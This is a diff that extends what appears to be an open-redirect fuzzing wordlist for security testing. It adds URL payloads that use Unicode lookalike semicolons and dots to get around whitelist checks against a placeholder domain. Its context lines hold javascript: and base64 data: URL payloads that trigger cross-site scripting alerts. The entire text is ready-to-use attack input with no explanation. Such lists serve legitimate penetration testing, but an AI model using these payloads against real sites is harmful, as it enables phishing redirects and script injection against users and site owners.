@@ -252,7 +252,9 @@ http://localdomain.pw\twww.whitelisteddomain.tld/
 //www.whitelisteddomain.tld+&@localdomain.pw#+@www.whitelisteddomain.tld/
 //localdomain.pw\twww.whitelisteddomain.tld/
 //;@localdomain.pw
+//﹔@localdomain.pw
 http://;@localdomain.pw
+http://﹔@localdomain.pw
 @localdomain.pw
 javascript://https://www.whitelisteddomain.tld/?z=%0Aalert(1)
 data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
@@ -277,6 +279,7 @@ http:/localdomain.pw
 http://.localdomain.pw
 .localdomain.pw
 ///\;@localdomain.pw
+///\﹔@localdomain.pw
 ///localdomain.pw
 /////localdomain.pw/
 /////localdomain.pw
@@ -293,7 +296,9 @@ http://www.localdomain.pw\.www.whitelisteddomain.tld
 %19Jav%09asc%09ript:https%20://www.whitelisteddomain.tld/%250Aconfirm%25281%2529
 %01https://localdomain.pw
 www.whitelisteddomain.tld;@localdomain.pw
+www.whitelisteddomain.tld﹔@localdomain.pw
 https://www.whitelisteddomain.tld;@localdomain.pw
+https://www.whitelisteddomain.tld﹔@localdomain.pw
 http:%0a%0dlocaldomain.pw
 https://%0a%0dlocaldomain.pw
 localdomain.pw/www.whitelisteddomain.tld
@@ -432,7 +437,9 @@ http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twww.whitelisteddomain.tl
 //www.whitelisteddomain.tld+&@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@www.whitelisteddomain.tld/
 //Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\twww.whitelisteddomain.tld/
 //;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+//﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http://;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+http://﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 @Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.www.whitelisteddomain.tld/
 http://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%5c%5c.www.whitelisteddomain.tld/
@@ -452,13 +459,16 @@ http:/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http://.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 .Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ///\;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+///\﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 ///Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 /////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
 /////Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http://www.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.www.whitelisteddomain.tld
 %01https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 www.whitelisteddomain.tld;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+www.whitelisteddomain.tld﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https://www.whitelisteddomain.tld;@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
+https://www.whitelisteddomain.tld﹔@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 http:%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 https://%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
@@ -473,6 +483,7 @@ https%3A/localdomain.pw
 https%3A/Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ%2f%2f.www.whitelisteddomain.tld/
 https%3A/:@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\@www.whitelisteddomain.tld
 https%3A/;@localdomain.pw
+https%3A/﹔@localdomain.pw
 https%3A/www.Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ\.www.whitelisteddomain.tld
 javascript:%250Aalert(1)
 javascript:alert(1)//https://www.whitelisteddomain.tld
@@ -486,3 +497,5 @@ javascript:alert(1)//https://www.whitelisteddomain.tld
 //.@.@Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 javascript:new%20Function`al\ert\`1\``;
 %09Jav%09ascript:alert(1)
+http://localdomain｡pw\ᵗwww.whitelisteddomain.tld
+http://www.whitelisteddomain.tld｡₨/
